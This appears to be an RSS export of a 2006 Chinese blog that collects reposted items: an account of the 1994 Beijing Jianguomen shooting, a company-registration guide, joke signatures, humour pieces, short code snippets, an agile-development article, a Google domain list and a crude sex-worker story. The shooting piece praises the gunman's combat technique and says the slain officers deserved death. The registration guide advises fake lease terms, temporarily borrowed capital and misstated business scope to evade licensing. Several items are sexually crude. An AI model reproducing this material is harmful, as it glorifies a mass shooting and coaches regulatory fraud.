      <description>一九九四年九月二十一日，加拿大各大电视台突然播出紧急新闻：中国首都北京建国门外 使馆区附近发生枪战，伊朗外交官和他九岁的儿子当场死亡。人们在电视萤幕上看到，一 辆黄色的面的挡风玻璃已经粉碎；一辆两节相连的公共汽车浑身弹洞；受了伤的伊朗外交 官的孩子在车里大哭大叫；武警和警察在持著枪奔跑；人们抬著伤者急冲冲地撤离。与此 同时，叭叭砰砰的枪声不断地爆响著。
中国政府在事件发生后，立即关闭了电视卫星传播，禁止各国记者进行现场采访。加拿 大记者是因为枪战就发生在他们的外交公寓下面，而且是因为他们估计到了中国政府可能 采取措施，在中国政府尚未醒过来的瞬间，抢在禁令之前转播了现场实况。这才使人们看 到了几个珍贵的镜头。
国内的新闻媒介全部奉命对此保持沉默。只是当天的北京晚报被授权刊登了新华社的一 条一百余字的新闻。以致于该报价格暴涨，据说最高的被炒到了原价的五十倍。
凶犯系驻守在通县的北京卫戍区三师十二团的中尉副连长，刚满三十岁，来自河南农村 的田明建。该人聪明机智，勤恳好学，曾被保送西安陆军学校深造，军事技术颇有造诣， 特别是枪法，是学员中的尖子。在团司令部任参谋时，深受上司赏识，上下左右的关系也 十分圆滑，许多官兵在涉及切身利益的关头，常常托他代为疏通，既然一言兴邦，自然也 就少不了一字千金。一次，某战士重礼贡进，但求事无成，一气之下将他受贿的隐秘曝光 ，田明建遂被下放连队任职。副连长这个职务，按部队惯例是负责行政管理的。此前不久 ，一士兵请假探亲，田未批准。该战士平素与田关系不好，知道他借职权之便作梗刁难， 与之争吵不休，田盛怒之下，对他拳脚相加。不打人不骂人是部队的纪律，殴打战士更是 绝对禁止的。这就成为了轰动军营的事件。田明建停职反省，但一直思想不通，拒不承认 错误，并与营团两级主管言语对抗，上级遂决定予以处分，而且，公开警告说：再不悔过 ，将令其还乡务农。
此时又发生的另一件事促成了田的铤而走险。田在农村的妻子曾与其生下一女，像大多 数农村子弟一样，他一直盼望妻子能为其生个儿子，他受处分之前他妻子即已怀孕，由于 农村严格的计生政策，他一直对部队隐瞒自己老婆怀第二胎的事，受处分后团里检查田的 家信，得知其妻怀孕后即通知地方计生办，派人带其妻去乡里作强制人流，结果由于怀孕 已近七个月，出了医疗事故，不但孩子(后证实为男婴)没了，连大人也因失血过多而死亡 。田明建见似锦前程化作泡影，老婆儿子也没了，顿感心灰意冷人生绝望，他不甘于默默 地沈沦，决心采取极端方式呼唤社会的注意。部队的惯例是：被停职反省而非隔离反省者 ，在正式处分下达前，只是不工作，不出操课，而无须办理交接。这给田明建向社会寻求 报复提供了可能。
九月十九日晚，他请枪库保管员吃饭，并从他手中借了钥匙。他从连队的武器库中取出 一支部队刚刚装备不久的八一式步枪和满满六匣子弹。出操之前他把枪藏在检阅台旁边的 椅子下面。 他又和平时相熟的老乡战友打了招呼说第二天出操他叫卧倒就趴下(事后这几 人因发现徵兆却未举报受了处分)。
九月二十日晨，连队出操之际，他像所有因身体不适，度假，调离等而无需参加训练的 军人一样，站在旁边观望，谁也没觉得什么意外。谁知，当团政委来到操场上作例行视察 时，田明建突然喊卧倒然后出枪射击，团政委等四人当场死亡，十多人受伤。军营一时大 乱，田明建趁机窜上公路，劫持了一辆过路的吉普车，直奔天安门广场而去。
车过建国门立交桥附近突遇红灯，司机趁机将车撞到路旁的树上后弃车便逃，岂料遇上 田明建这样的枪手，只一枪就把他撂在那儿再也起不来了。田转身朝迎面驶来的黄色面的 冲去，出租汽车司机见凶犯朝自己来了，急忙开车门想逃，但未容他离车，无情的弹雨就 盖了过来。紧接著，田明建的枪口转向了路上的行人，车辆和建筑物，一时间血肉飞溅。 大批武警持枪赶到，企图用强大的火力将凶犯消灭。田以街心交通护栏为掩体，时而卧倒 时而半蹲，准确射击，数十名武警竟一时无法*前。恰在此时，一辆４４路公共汽车驶来 ，如果司机冷静机智，以最大油门全速直冲，本可有惊无险。但哪个司机受过这种训练呢 ？被横飞的枪弹吓懵了的司机，竟然把车停在了路中间，子弹成串地飞到车里，乘客纷纷 倒在血泊之中。不少早晨上班的人是被从自行车上扫下来的，正在这里硝烟弥漫，枪声震 耳之际，伊朗大使馆政务秘书尤素福穆汗默德皮什科纳里架车送孩子上学由此路过，一串 子弹飞来，尤素福当场身亡，四个孩子中一死两伤 田明建毕竟只是针对社会发泄不满闹事寻死，没有更慎密的思考和谋略，所以，枪战了一 阵之后，便且战且退被军警围困在雅宝路的一块空地上，所带的近两百发子弹将近打光， 他便用短点射压制警方火力，后来部队狙击手进入使馆区的高楼从背后向他射击他才中枪 毙命。
事件的发生时间正在国庆四十五周年的前十天，这个事件的发生，使得国务院总理李鹏 在当年的国庆讲话中，不得不加上了我国一些地方社会治安还有许多问题这样的话。
田建明事件反映出解放军中存在的很多问题。落后的管理体制。政工干部私拆他人信件 ，农村计生干部视人命如草芥，长此以往，必有大乱。四名团级干部死有余辜。
巷战，起码有三件不可或忘的要领，即：一，正面对敌，背有依托；二，敌众我寡，凭 险据守；三，弹勿虚发，留有后备。田选择半自动步枪而非冲锋枪是对的。
建国门枪战的全部资料所显示出来的田明建的战术动作，在低姿快速前进，利用地形地 物，以及沉着冷静对敌方面相当有素养，可是，他在几十名武警和警察在街树，楼房，车 辆掩蔽下向其逼近之际，竟然依旧背对对方狂奔，在最后，已经身陷包围圈中时，依然向 空旷处寻求生路，而不是就近利用建筑物隐蔽自己，作困兽之斗。
田在与武警接火之后，仍然胡乱扫射无关之物体，除了表明他意在闹事寻死之外，也表 现出他缺乏一个职业军人在巷战中所应有的本能。虽然他是在几乎打完所有子弹之后才被 击毙的，这至少也从一个侧面显示了他所在的北京卫戍部队的在巷战中的军事素养，作为 城市的卫戍部队，水平如此，很难说是完全合格的。
最值得一提的是，在香港，好莱乌警匪片中，以及各国特种部队纷纷仿效的单手换弹匣 的漂亮动作就是在这一天由田建明介绍给世界的。</description>
    </item>
    
    <item>
      <title>公司注册全程记录</title>
      <link>http://example.org/2006/08/18/e585ace58fb8e6b3a8e5868ce585a8e7a88be8aeb0e5bd95/</link>
      <pubDate>Fri, 18 Aug 2006 08:50:07 +0000</pubDate>
      
      <guid>http://example.org/2006/08/18/e585ace58fb8e6b3a8e5868ce585a8e7a88be8aeb0e5bd95/</guid>
      <description>本文的目的就是指导大家如何创办自己的公司，如果是商界浸淫已久的大款前辈们就可以不读了。项目： 首先你要明白经商成功与否的关键在于是否有一个好的项目，而不在于没有本钱，怎么找到一个好项目?这个因人而异，因地而异，不能作具体讨论。
基本上要根据你自身的综合的特点来选择行业和项目，还有就是你打算经商的当地的情况，要强调的是不管你对一个项目具有怎样大的把握，你都要进行市场调查，摸一摸底才好进行实际的投入。当然如果你有一位掌握实权的*的住的亲戚。那么恭喜你，你也不用读本文了，因为你已经具备了从资本主义初级阶段过渡到高级阶段的重要条件了。
资金：
对于刚走进社会大门的下岗学生来说，资金确实是一个难题，从亲戚朋友处借钱是主要筹资办法，还有就是几个人合伙了，因为本身开办一个有限责任公司需要2人以上50以下的股东，所以完全可以找合作伙伴来筹资，至于您有实力来开办独资的公司，本文也不建议您这么作，因为有限责任公司的起步价是10万元，是会白纸黑字写到营业执照上的，对以后公司股权的转让和形象很有好处，但这10万是不是用在公司上了，这完全由您自己决定，这笔钱完全可以暂借，拿到执照后再退还，而私人独资公司就不同了，除了要真金白银的投资外，这笔钱也不会写到公司的营业执照上，对以后公司的股权的转让和形象很不利，所以，即使您有钱开办独资公司，也请把您的双亲算上凑两个股东，注册成责任有限公司。另外，注册公司的资金很灵活，可以是实物，本文会在后面的验资报告瞒天过海法里有详细的介绍。
场地：
不要以为开办公司的场地不重要，确实，除了在上海以外您可以租任何一个民房作公司的场地，但请注意公司的经营年限是根据您的租房合同时间的长短是一致的，所以如果您的租房合同一年一签的话，您的执照也得一年一办，所以签合同时搞个意向协议，上面写上50年好了，这个是给工商局注册用的，实际的年限就是您跟房东的事了，还有就是您的房东一定要有房产证，这个注册时也需要。 好了有了这三样东西就可以开始注册公司了，首先是要想好一个名称，一般来讲都会通过，但是您的资金没有超过100万就不能在公司的名字里打上实业公司，这个不是什么大问题，之后拿到企业名称核准通知书交上相关的材料，公司即可注册了。
下面就是注册相关的问题了。 注册资金验资问题：
这个是由会计师事务所来完成，并不是由工商局来完成，所以验资是有花费的，一般10——50万都是六百元，还有银行至少要收200元，如果用实物来投资的话，费用的标准就没有个行价了，反正花费要高出现金验资许多，所以小规模的注册资金验资最好用现金，况且资金可以在公司注册完毕后取出，这个时间很短。
这里以10万注册资金为例，来讲讲怎么省钱。会计师事务所的钱是省不下来的，但银行的钱我们可以免了。过程是这样的，首先用你的企业名称核准通知书到一个银行开验资户，这个银行你要选好，在你们当地多转转，找一个坐落最偏僻的分理处级别的银行下手，好了,带上你的家伙（钱、企业名称核准通知书），和人（为了安全因为你要到最偏僻的地方），然后————开户。
接下来你要做的事就是去会计师事务所拿验资询证函（各地叫法可能不一样，反正就是一个介绍信类的东西）。
再去你刚才开户的银行分理处，他们会给你一个介绍信到他们的上级支行拿证明材料（分理处无权利开），这个不重要，重要的是你一定要找他们打你帐户的对帐单，可能有些银行要月底或有发生才能打，但是只要你坚持，他们小庙是不敢得罪您大神的，好了只要拿到了对帐单您就可以去会计师事务所做验资报告了，不要理会什么银行的证明材料.
因为那样，您会因为银行的一张纸而花上至少200元（看资金的多少，各银行的比例也不同），不用他们的证明您的验资报告同样有效，那么把帐户开在偏僻的地方不是很不方便，不用着急，公司注册后，还要开设基本帐户，您可以以税务局要在指定银行开基本帐户为由，把帐户迁到您公司附近，他们也没什么理由拒绝。 注册中经营范围问题：
这个其实是个很棘手的问题，因为不管您经营什么项目至少会有一个以上的行政部门您要拿到他们的资格证，才能经营。这就是办公司的手续真正繁琐的地方，应该在经营范围申请中尽量采取躲避的办法.
具体来说：比如您要开一家网吧，但开一家网吧要文化局、公安局、消防局3局的资格证才行，怎么办？您可以在经营项目中写远程教育，这样并没有“跑题”，也绕开了以上3局的资格证，您只要拿到教育局的资格证就可以了。还有这样写您可以瑭而簧之的往学校周围开，因为您搞的是教育啊。
总而言之，言而总之，规定是死的办法是活的。请不要看见大盖帽，就不要连你自己的想法都没有了。还有要提的就是，经营范围不要写太多，没用，也很难通过，到写税务申报表时，你再发挥也不迟。 公司章程问题：
工商局提供的公司章程的范本对公司的组织只作了最基本的框架规定，适用于大多数公司，对大多数公司也是不够的，你可以和股东们根据《公司法》修改工商局提供的章程范本，请不要忽略了这个问题，它关系到以后的利益分配，当然，您的其他股东是上文所提到的你的双亲的话，你可以不对范本作任何修改。
好了只要策略得当，您提供的材料齐全，在工商局注册成立公司是没有什么难度的，而根据笔者的体验，在工商局里没有任何关系的情况下，一个星期就办好了执照，相信如果你掌握了本文的要点，还要快。最后说说税务的申报。
税务的申报，由于是公司你不需要向工商局缴纳管理税，而对于地税局的申报来说，你可以选择独立核算和财务申报两种，两种方式各有利弊，但本文建议不要单一采用哪一种，在公司的发展初期您可以采用财务申报的方式，即每月交财务报表，按实际的营业额收，这样在公司的发展初期没什么业务，您就可以不用负担由于估税过高而承担高的部分。
到了有起色的时候就可以改为估税的方法，就是由税务局定，这样你可以不用负担申报方式的而透露您公司的真实情况，可以少交税。如果您公司请有专门的财务人员的话，在对付税务方面他们应该比笔者专业，所以也就不再班门弄斧了。
本攻略的要点都在上文了，其实当你拿到公司的营业执照开始，你的人生博弈才刚刚开始，你必须全力以赴，这就象一场马拉松，你不能停下来，否则再想比赛的话就得从起点开始。请记住你目标是跑到终点，而不是跑的最快。</description>
    </item>
    
    <item>
      <title>令人抓狂的签名档！</title>
      <link>http://example.org/2006/08/16/e4bba4e4babae68a93e78b82e79a84e7adbee5908de6a1a3efbc81/</link>
      <pubDate>Wed, 16 Aug 2006 09:57:26 +0000</pubDate>
      
      <guid>http://example.org/2006/08/16/e4bba4e4babae68a93e78b82e79a84e7adbee5908de6a1a3efbc81/</guid>
      <description>1.柏芝你走吧，我舍不得韩红！！！
2.按猪的审美观，我基本算得上是个帅哥~
3.我不是你想象中的那么完美那么坚强，金钱和美女就足以把我征服！
4.见到我以后你会突然发现——原来帅也可以是这样的具体呀~
5.姑姑，十六年后我们断肠崖见，到时候别忘了给我发短信！
6.自从两个自称是某名牌大学的毕业生后，我现在一般都自称文盲！
7.天使和魔鬼拿我的灵魂拔河玩~（转载请注明天涯社区）
8.我曾经是个天使，真的！在降临人世间时上帝慈祥地对我说：“去吧，孩子，你是个为补考而生的男人……”
9.初夜让人用肚脐眼给骗了……
10.男二号对女一号说：“你为什么要背着我去爱别人！”（2006隐讳签名之离骚）
11.抵制日货——日本****除外～
12.为人不识浙大男，便称猥亵也枉然～
13.男人偷腥时的智商仅次于爱因斯坦！
14.房价越来越高，所以，好男人越来越少……
15.来自侏罗纪的美女也能算是古典美女？？？
16.自去年“麦莎事件”后，CCTV现在唯一能让人相信的恐怕只剩下整点报时了……
17.午夜十二点准时下线！否则，公主就会变回灰姑娘～
18.有事秘书干，没事干秘书！
19.出门在外，请记住：一定要把牛B还给牛！
20.剥夺人民说话的权利，就如同强jian犯将一个女人摁倒在地却脱不下她的裤子一样令人抓狂～ 21.爱我免费，包年优惠！
22.上床前请出示您的健康证……
23.坐拥大奶名号，享受二奶待遇！
24.人生得意须尽欢，莫使娇妻空对房！
25.在天愿做比翼鸟，在地愿做同圈猪！
26.你放心，看到你我连食欲都没了，还谈什么性欲！！！
27.虽在裸睡中，但即插即用～
28.她在床上和床下一样咄咄逼人！
29.她说：“我要玩的是感觉，不是你的器官！！”
30.我喜欢“三心二意”的人：对我有爱心，对我有信心，对我有责任心；说话有创意，令我“满意”！
30.五马分尸中……你来一块不？
31.就叫我朝伟吧，虽然歌唱得像学友~
32.在喂猪的时候总会想起你……
33.上帝说：“要有光。”我说：“不批准！”于是便有了黑夜～
34.自打我变成了一泡屎，就再也没有人敢踩在我头顶上啦！
35.穿“人”字拖鞋，与刘翔赛跨栏，一局定乾坤，输了就引退江湖，目前正在积极备战ing……
36.我把KONKA的电视遥控器别在裤腰上，假装新买了个NOKIA手机～
37.如果早上来的晚一些的话，我想我会喜欢早上的……
38.给我织一条围巾，我愿以一生关怀相回报。否则，你就用围巾勒死我吧！
39.你的丑和你的脸没有关系……
40.一生中真爱一个女人就够了，哪个说不够我和他拼命！！
41.一时的冲动，子孙的危机！
42.强jian易躲，意淫难防！
43.JackSlowFu※ck——捷克斯洛伐克～
44.踏平富士山——让樱花不再浪漫！！
45.想污染一个地方有两种方法：垃圾，钞票。
46.淫以为荣，醉有风度~
47.宁尝鲜蜜一口，不吃烂桃一筐！
48.这个字念：锊！
49.真爱你的不是在雨天能为你撑起伞的那个人，而是能陪你一起淋病的那个~（C_chairman/chai2001）
50.天涯情侣版的“org” ╭╮ ˊ ┌──┬┘└┐ ╭┘　╭┘　│ ╰┐╭╮┐╭╮│)) └┘└┴┘└┘ 51.08年8月8号结婚是个不错的主意~
52.人生就是一场游戏，你遇到的障碍就是各种关卡，所以，让我们尽情地去攻略吧！
53.说什么都是废话——因为你就是个废人！
54.键盘时常跟不上思路……
55.若非当初拒绝穿上疯狂的红舞鞋，想必现在旋转得也像个陀螺吧～
57.日出只要在日落前出现就好，上课只要在下课前到达就好。
58.我坚持认为海带和虾皮是海鲜，这样我就可以跟自己的朋友很NB地说：“我经常吃海鲜！”
59.不要把时间浪费在不在乎你的人身上，受不了就去魔兽！
60.拉屎最低配置：钱江晚报一份；建议配置：体坛周报一份+草纸一张；豪华配置：中华一根+花花公子一本+草纸若干。
61.我喝水只喝纯净水，牛奶只喝纯牛奶，所以我很单纯……
62.为配合今年中国计划生育工作的胜利完成，本人决定暂时不和异性朋友接触，谢谢合作～</description>
    </item>
    
    <item>
      <title>预备老公的转正申请</title>
      <link>http://example.org/2006/08/16/e9a284e5a487e88081e585ace79a84e8bdace6ada3e794b3e8afb7/</link>
      <pubDate>Wed, 16 Aug 2006 06:52:07 +0000</pubDate>
      
      <guid>http://example.org/2006/08/16/e9a284e5a487e88081e585ace79a84e8bdace6ada3e794b3e8afb7/</guid>
      <description>尊敬的阿P: 人生中总有几个时刻难以忘怀。就我而言，俺永远记得那几个刻骨铭心的时间：5年前的某天，我们不期而遇；4年前的某天，你把俺列为重点培养对象；一年前的今天，你郑重把俺列为预备老公。这一连串成绩的取得，虽说是俺努力的结果，但俺深知与您的关怀和帮助是分不开的。
七月高考一声炮响，给俺送来了大学时光，也送来了你。在不断的接触中，俺深刻体会到：您是一个集外表美和内心美于一体的女孩；是一个被实践不断证明了的“上得厅堂下得厨房”的姑娘；是一个能解救我于单身水火之中的女神。我别无选择，积极向您靠拢：几乎天天一份思想汇报；利用一切可能的机会邀您出来谈心，哪里条件艰苦就奔哪里，小山坡，密树林，那些人迹罕至的地方都留下了我们的足迹和身影。您平易近人，对俺这种追求上进的表现给予了及时肯定，并体恤下情，诲人不倦，对我的生活和学习发出了一系列的指导性意见。在您的帮助下，俺改掉了许多以前从未意识到的恶习，比如挖鼻子；在您的帮助下，我逐渐和宿舍里的同性俗人们划清了界限，还渐渐改掉了喝酒吸烟说粗话的毛病，现在俺口若兰花，眉清目秀；在您的帮助下，俺的知识面大增，头一次搞清楚了一些小资读物和时尚品牌……总之，通过您的培养和教育，使俺坚定了这样一个信念：一定在您这棵树上吊死，坚决拜倒在您的石榴裙下。
一年前，当俺得知自己被列为预备老公后，激动得几宿没睡。没曾想俺的表现如此拙劣，组织上还是给了俺这高的荣誉。
俺深知自己离一个合格老公的要求还有很远，还有很长的路要走。这一年来，俺不敢懈怠，始终以一名正式老公的标准严格要求自己，时时警醒自己。 一年来，俺忠实的履行了对您的承诺，鞍前马后，尽心尽力。您逛商场，俺等得；您花钱购物，俺舍得；您发脾气，俺受得；您化妆打扮，俺等得。始终把“两个凡是”落到实处：凡是您说的没有错的，凡是您做的都是对的。 一年来，除了经常性的思想汇报和心得体会按时上交外，俺还从各个方面提高个人的修养。俺翻阅了大量古籍，对桎梏了中国妇女几千年的封建礼教进行了无情的鞭挞，对“三从四德”思想、《闺训千字文》和《女儿经》进行了无情批判（具体内容您可参见俺提交的月度思想汇报，此处暂略）。要俺说，人类最文明最辉煌最伟大的时期为母系社会时期，真正的三从四德应该是：在家从母，结婚从妇，妇亡从女！ 社会在发展，俺的思想也在与时俱进。结合几千年的文化沉淀和您无时无刻的言传身教，俺创造性地总结出了家庭三个代表，以此来指导家庭生活：始终代表媳妇的一切要求，始终代表媳妇的需求方向，始终代表媳妇娘家人的根本利益。
俺还深刻认识到：光说不练嘴把式。口上光涂蜜不行，关键要落到实处。为把自己锤炼成一个合格的家庭妇男，一年来俺认真研究了好几本烹调菜谱和各种衣物的洗涤说明，并多次进行实践演练。为把自己培养成一个多面手，一年来俺还涉猎了诸如电工、木工、管道工、搬运工等多个工作领域，以便今后随时应对可能发生的家庭琐事，比如停电，家具损坏，下水道被堵，扛米扛气罐等等。
时至今日，俺一年的考验期已满，在此俺郑重向组织上提出转正申请。如果您同意俺如期转正，俺一定会再接再厉，戒骄戒躁，力争做到更好；如果您不批准俺如期转正，俺也不会气馁，自暴自弃，俺会化被动为主动，化压力为动力，力争在宽限期内，以实际行动获得您的批准！ 请您看俺的实际行动吧！
申请人：*** 20××年×月×日</description>
    </item>
    
    <item>
      <title>爆笑范伟经典语录</title>
      <link>http://example.org/2006/08/15/e78886e7ac91e88c83e4bc9fe7bb8fe585b8e8afade5bd95/</link>
      <pubDate>Tue, 15 Aug 2006 08:08:00 +0000</pubDate>
      
      <guid>http://example.org/2006/08/15/e78886e7ac91e88c83e4bc9fe7bb8fe585b8e8afade5bd95/</guid>
      <description>爆笑范伟经典语录
1.人跟人的差距咋就这么大呢！
2.大哥，你要砸就砸我吧！
3.这是病人与病人之间在探讨病情，你瞎掺和啥呀你！
4.大哥，我真抽了！
5.拐一年卖一年，缘分啊！吃一堑长一智，谢谢啊！横批是：自学成才！
6.你这人怎么不按套路出牌？
7.忽海无涯，回头是岸。
8.小样我整不死你！ 9.一般人我不告诉他。
10.忽悠，接着忽悠！
11.苍天啊！大地啊！哪位天使大姐给我出的这口气啊！
12.IC、IP、IQ卡，统统告诉我密码！
13.等……等会儿……我……我要劫个色。
14.你也不理我，我成狗不理了。
15.啥也不说了，全在酒里边了。
16.唉，就……就你觉得这个事儿有……有意思吗？
17.弃勺从教。
18.戴功立罪。
19.这个人站的高度不同，看问题的角度就是不一样！
20.愚昧，太愚昧，你老愚昧了！知道不？
21.智商是什么东西，给……给我拿来！
22.婚姻是人的第二次投胎，你老舅我就没投好！
23.一生就看一个女人是不科学的，容易看出病来。
24.有钱男子汉，没钱汉子难啊！
25.这孩子太有心眼了，赶……赶紧打个倒骑驴。这孩子哪能干这小本生意，人家得干大生意！
26.好歹我也是个戴眼镜的，怎么能干这事呢？
27.得不到女同志的青睐，得到了都是伤害。
28.我吃胡萝卜素，这老有营养了！刚才我不是没看见苹果吗？
29.这活挺霸道的啊？
30.论成败，人生豪迈，大……大不了……重头再……再来……
31.要想生活过得去，不怕身上背点绿。横批：忍者神龟！
32.是你爸大还是城市大啊？
33.钱是王八蛋，没了再去赚！
34.你们敬我一尺，我敬你们一丈，尊重他人人格，树立模范形象！
35.高职不如高薪，高薪不如高寿，高寿不如高兴。
36.上顿陪，下顿陪，终于陪出胃下垂……
37.自己的路，让前妻后悔去吧！
38.咋地？我……我就是……开元市维……维多利亚娱乐……广场总经理的保镖！
39.床前明月光，粒粒皆辛苦；举头望明月，更上一层楼。
40.幸福就是：我饿了，看见别人手里拿个肉包子，他就比我幸福；我冷了，看见别人穿了一件厚棉袄，他就比我幸福；我想上茅房，就一个坑，你蹲那儿了，你就比我幸福。</description>
    </item>
    
    <item>
      <title>GET</title>
      <link>http://example.org/2006/07/24/get/</link>
      <pubDate>Mon, 24 Jul 2006 05:45:08 +0000</pubDate>
      
      <guid>http://example.org/2006/07/24/get/</guid>
      <description>$v) { $foo .= $k; } echo $foo; ?&amp;gt;</description>
    </item>
    
    <item>
      <title>极限编程与敏捷开发xp</title>
      <link>http://example.org/2006/07/21/e69e81e99990e7bc96e7a88be4b88ee6958fe68db7e5bc80e58f91xp/</link>
      <pubDate>Fri, 21 Jul 2006 07:27:26 +0000</pubDate>
      
      <guid>http://example.org/2006/07/21/e69e81e99990e7bc96e7a88be4b88ee6958fe68db7e5bc80e58f91xp/</guid>
      <description>徐景周
在按照我的理解方式审查了软件开发的生命周期后，我得出一个结论：实际上满足工程设计标准的惟一软件文档，就是源代码清单。 &amp;ndash; Jack Reeves 简介 2001年，为了解决许多公司的软件团队陷入不断增长的过程泥潭，一批业界专家一起概括出了一些可以让软件开发团队具有快速工作、响应变化能力的价值观和原则，他们称自己为敏捷联盟。敏捷开发过程的方法很多，主要有：SCRUM，Crystal,特征驱动软件开发（Feature Driven Development，简称FDD），自适应软件开发(Adaptive Software Development，简称ASD)，以及最重要的极限编程(eXtreme Programming,简称XP)。极限编程(XP)是于1998年由Smalltalk社群中的大师级人物Kent Beck首先倡导的。
极限编程 设计和编程都是人的活动。忘记这一点，将会失去一切。 &amp;ndash; Bjarne Stroustrup
极限编程(XP)是敏捷方法中最箸名的一个。它是由一系列简单却互相依赖的实践组成。这些实践结合在一起形成了一个胜于部分结合的整体。 下面是极限编程的有效实践： 1、 完整团队 XP项目的所有参与者（开发人员、客户、测试人员等）一起工作在一个开放的场所中，他们是同一个团队的成员。这个场所的墙壁上随意悬挂着大幅的、显著的图表以及其他一些显示他们进度的东西。 2、 计划游戏 计划是持续的、循序渐进的。每2周，开发人员就为下2周估算候选特性的成本，而客户则根据成本和商务价值来选择要实现的特性。 3、 客户测试 作为选择每个所期望的特性的一部分，客户可以根据脚本语言来定义出自动验收测试来表明该特性可以工作。 4、 简单设计 团队保持设计恰好和当前的系统功能相匹配。它通过了所有的测试，不包含任何重复，表达出了编写者想表达的所有东西，并且包含尽可能少的代码。 5、 结对编程 所有的产品软件都是由两个程序员、并排坐在一起在同一台机器上构建的。 6、 测试驱动开发 编写单元测试是一个验证行为，更是一个设计行为。同样，它更是一种编写文档的行为。编写单元测试避免了相当数量的反馈循环，尤其是功功能能验证方面的反馈循环。程序员以非常短的循环周期工作，他们先增加一个失败的测试，然后使之通过。 7、 改进设计 随时利用重构方法改进已经腐化的代码，保持代码尽可能的干净、具有表达力。 8、 持续集成 团队总是使系统完整地被集成。一个人拆入（Check in）后，其它所有人责任代码集成。 9、 集体代码所有权 任何结对的程序员都可以在任何时候改进任何代码。没有程序员对任何一个特定的模块或技术单独负责，每个人都可以参与任何其它方面的开发。 10、编码标准 系统中所有的代码看起来就好像是被单独一人编写的。 11、隐喻 将整个系统联系在一起的全局视图；它是系统的未来影像，是它使得所有单独模块的位置和外观变得明显直观。如果模块的外观与整个隐喻不符，那么你就知道该模块是错误的。 12、可持续的速度 团队只有持久才有获胜的希望。他们以能够长期维持的速度努力工作，他们保存精力，他们把项目看作是马拉松长跑，而不是全速短跑。 极限编程是一组简单、具体的实践，这些实践结合在形成了一个敏捷开发过程。极限编程是一种优良的、通用的软件开发方法，项目团队可以拿来直接采用，也可以增加一些实践，或者对其中的一些实践进行修改后再采用。
敏捷开发 人与人之间的交互是复杂的，并且其效果从来都是难以预期的，但却是工作中最重要的方面。 &amp;ndash; Tom DeMacro和Timothy Lister
敏捷软件开发宣言： n 个体和交互 胜过 过程和工具 n 可以工作的软件 胜过 面面俱到的文档 n 客户合作 胜过 合同谈判 n 响应变化 胜过 遵循计划 虽然右项也有价值，但是我们认为左项具有更大的价值。</description>
    </item>
    
    <item>
      <title>Google域名大全（2006.7.18）</title>
      <link>http://example.org/2006/07/20/googlee59f9fe5908de5a4a7e585a8efbc882006718efbc89/</link>
      <pubDate>Thu, 20 Jul 2006 10:30:32 +0000</pubDate>
      
      <guid>http://example.org/2006/07/20/googlee59f9fe5908de5a4a7e585a8efbc882006718efbc89/</guid>
      <description>下面是目前的列表，不一定已经完整了，你可以把下面的列表和之前本站所给出的做个对比总结，或者关注Neil Patel的补充：
21150.com 3576.net 38389438.com 466453.com 7sou.com 95539.com
adsbygoogle.com adsense.net adwords.com adwords.net adwords.org adwordselect.com adwordsexample.com adwordsgoogle.com adwordsselect.com adwords-select.com adwordsselect.net adwordsselect.org akwan.com allevil.org altos.us android.com answergoogle.com answer-google.com answersgoogle.com answers-google.com appliedsemantics.com appsem.com apsem.com arabgoogle.com arabicgoogle.com askgoogle.com atlantis9.org averitablebevy.com
bakuhatsu.net beckers-erkelenz.com bigcitysmallbank.com blogger.com blogspot.com bon-vivant.net book300.com
canalportugal.info cashexperiment.com catalogsgoogle.com chinagoogle.com clinilab.net cobrasearch.com conversionuniversity.com crotales.com
dbanks.org deja.com deja.net dejadiscussion.com dejadiscussions.com deja-discussions.com dejanews.com dejanews.net dejanews.org dejastinks.com dejastinks.net dejasucks.net dejatracker.com deja-tracker.com delsolpm.net divesfl.com dmarc.net dodgeball.com dontswitch.com</description>
    </item>
    
    <item>
      <title>叁石乱发</title>
      <link>http://example.org/2006/07/20/e38080e58f81e79fb3e4b9b1e58f91/</link>
      <pubDate>Thu, 20 Jul 2006 10:28:25 +0000</pubDate>
      
      <guid>http://example.org/2006/07/20/e38080e58f81e79fb3e4b9b1e58f91/</guid>
      <description>function getimg() { //obj = document.getElementById(&amp;lsquo;my&amp;rsquo;); obj = document.all.pic; if(obj.readyState!=&amp;ldquo;complete&amp;rdquo;){ return false; } if(obj.offsetWidth &amp;gt; 500) { obj.width=500; } //alert(obj.offsetHeight); //alert(obj.offsetWidth); }
判断加载</description>
    </item>
    
    <item>
      <title>月薪80000的北京小姐给我上了震撼一课</title>
      <link>http://example.org/2006/07/20/e69c88e896aa80000e79a84e58c97e4baace5b08fe5a790e7bb99e68891e4b88ae4ba86e99c87e692bce4b880e8afbe/</link>
      <pubDate>Thu, 20 Jul 2006 01:43:25 +0000</pubDate>
      
      <guid>http://example.org/2006/07/20/e69c88e896aa80000e79a84e58c97e4baace5b08fe5a790e7bb99e68891e4b88ae4ba86e99c87e692bce4b880e8afbe/</guid>
      <description>这个小姐做CSI恐怕也行。 这个站街小姐太强劲了，要做生意额朋友好好看看。。。
我突然觉得想找个女人，于是匆匆结束了一个会议，在国贸现代城前搜索站街女。一个温州mm发现了我，非常专业的、径直的走在我的面前。这一走，于是有了后面的这个让我深感震撼的故事，象上了一堂生动的MBA案例课。为了忠实于这名小姐的原意，我凭记忆尽量重复她原来的话。
“先生想做什么？……好的，全套冰火毒龙红绳。我在朝阳就喜欢做现代城的生意。这里我只做两个地方。现代城，京广中心。你知道吗？看到你之前，我在现代城门口兜了两圈，终于被我看到你了！从写字楼里出来的，肯定做全套~~~”
“哦？你很有方法嘛！”我附和了一下。
“做小姐，也要用科学的方法。”她说。我一愣，顿时很有些兴趣“什么科学的方法？”
“要懂得统计。我做过精确的计算。我说给你听啊。我个月做22天的生意，每天成本272.7元……”
“怎么算出来的？”我追问。
“你算啊，为了客人有好的环境，我租高级公寓每个月要交3000元房租，为了使自己上档次区别于一般的小姐，每个月买衣服和化妆品要1500左右，加上每月吃饭1500元左右。一个月做22天生意，平均每天固定成本是不是就是272.7元？”，我有些惊讶。我找了10年的小姐，第一次听到有小姐这么计算成本。以前的小姐都和我说，每炮300元，另外包夜800之类的。
“成本是不能按次数算的，只能按时间算。你看，我每天都记帐。我可以看到一个月的详细记录。我做过数据分析，每次接客之间的空闲时间平均为7小时。如果找了一个做推油的，100元，大概要做一小时。也就是每一个100元的客人要花8小时的成本，就是每小时赚12.5元。不赚钱啊！如果说做冰火，漫游，毒龙的客人是吃饭，做100元的客人连吃菜都算不上，只能算是撒了些味精。”
强！这个mm听上去真不象站街女，到象是一位成本核算师。“那你怎么办呢？”我更感兴趣了，继续问。看来去小姐家的路上还能学到新东西。
